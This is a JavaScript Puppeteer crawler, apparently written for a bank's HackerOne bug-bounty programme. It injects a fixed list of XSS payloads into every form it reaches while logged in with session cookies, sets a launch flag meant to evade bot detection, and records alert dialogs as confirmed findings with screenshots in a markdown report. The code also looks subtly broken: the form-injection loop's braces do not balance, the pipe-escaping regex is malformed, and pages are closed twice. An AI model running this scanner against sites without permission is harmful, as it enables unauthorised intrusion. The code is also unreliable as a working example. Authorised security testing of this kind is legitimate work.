import puppeteer from 'puppeteer';
import crypto from 'crypto';
import fs from 'fs';
import path from 'path';

// ==========================================
// 🛠️ PROGRAM CONFIGURATION
// ==========================================
const START_URL = 'https://example.com';          // Target baseline application entry route
const MAX_DEPTH = 3;                              // Prevent infinite crawler traversal recursion
const RESEARCH_HEADER_USER = 'your_h1_username';  // Banco Plata mandatory identification tracking profile

// Authentication Configuration (Cookie Injection Engine)
const AUTH_COOKIES = [
    {
        name: 'session_id',
        value: 'REPLACE_WITH_VALID_SESSION_TOKEN',
        domain: 'example.com',
        path: '/',
        httpOnly: true,
        secure: true
    }
];

// Comprehensive XSS Fuzzing Matrix
const XSS_PAYLOADS = [
    '"><script>alert(document.domain)</script>',
    'javascript:alert(1)',
    '<img src=x onerror=alert(1)>',
    '\'"--><svg/onload=alert(1)>'
];

// Output Artifact Directories
const SCREENSHOT_DIR = './xss_proofs';
const REPORT_FILE = 'generated/xss_findings_report.md';

// Global Directed Graph State Registries
const visitedStates = new Set();
const stateQueue = []; // Breadth-First Search Processing Queue
let vulnerabilityCount = 0;

/**
 * Initializes physical reporting files and local directory containers
 */
function initializeEnvironment() {
    if (!fs.existsSync(SCREENSHOT_DIR)) {
        fs.mkdirSync(SCREENSHOT_DIR, { recursive: true });
    }
    
    // Ensure the output folder structure exists safely
    const reportDir = path.dirname(REPORT_FILE);
    if (!fs.existsSync(reportDir)) {
        fs.mkdirSync(reportDir, { recursive: true });
    }

    const initialReportHeader = `# 🛡️ Banco Plata Vulnerability Scan Report
Generated on: ${new Date().toISOString()}
Target Application: ${START_URL}
Research Operator: ${RESEARCH_HEADER_USER}

## 📊 Summary of Findings
* **Status**: Analysis Concluded
* **Vulnerabilities Identified**: {{VULN_COUNT}}

## 🔍 Detailed Vulnerability Log

| Severity | Vulnerability Type | Trigger Location URL | Triggering Payload | Evidence Screenshot File |
| :--- | :--- | :--- | :--- | :--- |
`;
    fs.writeFileSync(REPORT_FILE, initialReportHeader, 'utf8');
}

/**
 * Appends confirmed exploitation records straight to the live markdown document
 */
function logVulnerabilityToReport(url, payload, screenshotPath) {
    vulnerabilityCount++;
    const logLine = `| High | DOM-Based XSS | \`${url}\` | \`${payload.replace(/`/g, '\\`').replace(/\\|/g, '\\|')}\` | [\`${path.basename(screenshotPath)}\`](../${screenshotPath}) |\n`;
    fs.appendFileSync(REPORT_FILE, logLine, 'utf8');
}

/**
 * Concludes document execution by rewriting metadata with actual validation counts
 */
function finaliseReportFile() {
    let content = fs.readFileSync(REPORT_FILE, 'utf8');
    content = content.replace('{{VULN_COUNT}}', vulnerabilityCount.toString());
    fs.writeFileSync(REPORT_FILE, content, 'utf8');
}

/**
 * Structural Graph Fingerprinting Engine
 * Abstract layouts into architectural templates to avoid entrapment states (e.g., dynamic calendars).
 */
async function getPageFingerprint(page) {
    const url = await page.url();
    
    const domStructure = await page.evaluate(() => {
        return Array.from(document.querySelectorAll('*'))
            .map(el => el.tagName)
            .join(',');
    });
    
    const hash = crypto.createHash('sha256')
        .update(`${url}|${domStructure}`)
        .digest('hex');
    return { hash, url };
}

/**
 * XSS Alert Event & Execution Interception Context
 */
async function setupSecurityListeners(page, currentPayload) {
    page.on('dialog', async dialog => {
        if (dialog.type() === 'alert' || dialog.type() === 'confirm') {
            const detectionUrl = await page.url();
            console.log(`\n[🔥 XSS BUG CONFIRMED] Execution verified on context: ${detectionUrl}`);
            
            const timestamp = Date.now();
            const screenshotPath = path.join(SCREENSHOT_DIR, `xss_evidence_${timestamp}.png`);
            
            try {
                await page.screenshot({ path: screenshotPath, fullPage: true });
                console.log(`   [📸 Evidence Capture] Snapshot saved to: ${screenshotPath}`);
            } catch (screenshotError) {
                console.error(`   [⚠️ Capture Skipped] Failed creating canvas viewport snapshot: ${screenshotError.message}`);
            }

            logVulnerabilityToReport(detectionUrl, currentPayload, screenshotPath);
            await dialog.dismiss();
        }
    });

    page.on('pageerror', error => {
        if (error.message.includes('XSS') || error.message.includes('Unexpected token')) {
            console.log(`   [⚠️ DOM Anomaly Observed] Structural engine runtime warning: ${error.message}`);
        }
    });
}

/**
 * Directed Graph State-Edge Discovery Vector
 */
async function discoverEdges(page) {
    return await page.evaluate(() => {
        const elements = document.querySelectorAll('a, button, input[type="submit"], [role="button"]');
        return Array.from(elements).map((el, index) => {
            return {
                index,
                tagName: el.tagName,
                id: el.id || '',
                className: el.className || '',
                text: el.innerText ? el.innerText.substring(0, 15).trim() : ''
            };
        });
    });
}

/**
 * Graph Traversal Node Orchestration & Fuzzing Engine
 */
async function exploreNode(browser, stateNode) {
    const { url, depth, actionsHistory } = stateNode;
    
    if (depth > MAX_DEPTH) return;

    console.log(`[🔍 Graph Exploration] Depth Level: ${depth} | Transitioning Node: ${url}`);
    
    const page = await browser.newPage();
    
    // Compliance with Banco Plata session tracking requirements
    await page.setExtraHTTPHeaders({
        'X-HackerOne-Research': RESEARCH_HEADER_USER
    });

    // Seed preset active user access profile parameters prior to initiating path logic
    await page.setCookie(...AUTH_COOKIES);

    try {
        await page.goto(url, { waitUntil: 'networkidle2', timeout: 12000 });

        // --- SECTION 1: REPLAY STATE TRANSITION HISTORY ---
        for (const action of actionsHistory) {
            if (action.type === 'click') {
                await page.evaluate((idx) => {
                    const el = document.querySelectorAll('a, button, input[type="submit"], [role="button"]')[idx];
                    if (el) el.click();
                }, action.selectorIndex);
                await page.evaluate(() => new Promise(resolve => setTimeout(resolve, 800)));
            }
        }

        // --- SECTION 2: AUTOMATED FORM INJECTION SUBSYSTEM ---
        const formsCount = await page.evaluate(() => document.querySelectorAll('form').length);
        if (formsCount > 0) {
            console.log(`   [📝 Form Parsing] Found ${formsCount} fields context regions inside this specific state view.`);
            
            for (let formIndex = 0; formIndex < formsCount; formIndex++) {
                for (const payload of XSS_PAYLOADS) {
                    
                    // Re-apply runtime dynamic interception state markers tied to the localized tracking payload
                    page.removeAllListeners('dialog');
                    await setupSecurityListeners(page, payload);

                    const isFormSubmitted = await page.evaluate((fIdx, currentPayload) => {
                        const form = document.querySelectorAll('form')[fIdx];
                        if (!form) return false;

                        const inputTargets = form.querySelectorAll('input[type="text"], input[type="search"], input[type="email"], textarea');
                        if (inputTargets.length === 0) return false;

                        inputTargets.forEach(input => {
                            input.value = currentPayload;
                            input.dispatchEvent(new Event('input', { bubbles: true }));
                            input.dispatchEvent(new Event('change', { bubbles: true }));
                        });

                        const submitButton = form.querySelector('button[type="submit"], input[type="submit"]');
                        if (submitButton) {
                            submitButton.click();
                        } else {
                            form.submit();
                        }
                        return true;
                    }, formIndex, payload);

                    if (isFormSubmitted) {
                        console.log(`   [🚀 Injection Fired] Form Index [${formIndex}] mutated using value: [${payload.substring(0, 22)}]`);
                        
                        // Buffer execution time window to map trailing async lifecycle parameters
                        await page.evaluate(() => new Promise(resolve => setTimeout(resolve, 1500)));
                        
                        const postSubmitFingerprint = await getPageFingerprint(page);
                        if (!visitedStates.has(postSubmitFingerprint.hash)) {
                            visitedStates.add(postSubmitFingerprint.hash);
                            const currentLandingUrl = await page.url();
                            
                            console.log(`   [🆕 State Discovered] Form landing layout created a new structural state node: ${currentLandingUrl}`);
                            stateQueue.push({
                                url: currentLandingUrl,
                                depth: depth + 1,
                                actionsHistory: [...actionsHistory, { type: 'form_submit', description: `Form_${formIndex}_Payload` }]
                            });
                        }
                        
                    // --- END OF FORM INJECTION LOOP ---
                    // Hard reset the automation layer back to the baseline node state configuration
                    await page.goto(url, { waitUntil: 'networkidle2', timeout: 10000 });
                }
            }
        }

        // ==========================================
        // 🎯 SECTION 3: GRAPH METADATA VERIFICATION MATRIX
        // ==========================================
        const currentFingerprint = await getPageFingerprint(page);
        
        if (visitedStates.has(currentFingerprint.hash)) {
            console.log(`   [🔄 Loop Prevented] Matches known structural footprint layout. Breaking traversal pathway context.`);
            await page.close();
            return;
        }
        
        // Register the newly discovered structural state node
        visitedStates.add(currentFingerprint.hash);

        // ==========================================
        // 🗺️ SECTION 4: EDGE ROUTING & BFS ENQUEUING
        // ==========================================
        const edges = await discoverEdges(page);
        
        for (const edge of edges) {
            if (edge.tagName === 'A') {
                const href = await page.evaluate((idx) => document.querySelectorAll('a')[idx].href, edge.index);
                
                // Enforce localized target perimeter filtering constraints
                if (href && href.startsWith(START_URL) && !visitedStates.has(href)) {
                    stateQueue.push({
                        url: href,
                        depth: depth + 1,
                        actionsHistory: [
                            ...actionsHistory, 
                            { 
                                type: 'click', 
                                selectorIndex: edge.index, 
                                label: `${edge.tagName}->${edge.text}` 
                            }
                        ]
                    });
                }
            }
        }

    } catch (err) {
        console.error(`[❌ Automation Process Faulted] Issue resolving processing bounds on node ${url}: ${err.message}`);
    } finally {
        await page.close();
    }
}

// ==========================================
// 🚀 MASTER OPERATIONS ORCHESTRATOR
// ==========================================
async function runFSMScanner() {
    console.log(`====================================================================`);
    console.log(`🏁 Initializing Full FSM Directed-Graph Security Automation Engine`);
    console.log(`📍 Perimeter Baseline Entry Route Vector: ${START_URL}`);
    console.log(`====================================================================\n`);

    // Setup folder systems and report headers
    initializeEnvironment();

    const browser = await puppeteer.launch({
        headless: true, // Set to false to visually observe the browser behavior in real-time
        args: [
            '--no-sandbox', 
            '--disable-setuid-sandbox',
            '--disable-blink-features=AutomationControlled' // Helps bypass basic bot detection
        ]
    });

    // Seed the foundational entry node state into the BFS tracking queue
    stateQueue.push({
        url: START_URL,
        depth: 0,
        actionsHistory: []
    });

    // Execute state space traversal until all unique reachable vertices are mapped
    while (stateQueue.length > 0) {
        const structuralStateNode = stateQueue.shift();
        await exploreNode(browser, structuralStateNode);
    }

    // Rewrite placeholder tags with verified vulnerability stats
    finaliseReportFile();

    console.log('\n====================================================================');
    console.log(`🏁 Crawl lifecycle concluded. Consolidated markdown report finalized.`);
    console.log(`📊 Output Location Saved: ${REPORT_FILE}`);
    console.log('====================================================================');
    
    await browser.close();
}

// Execute program execution layer
runFSMScanner();
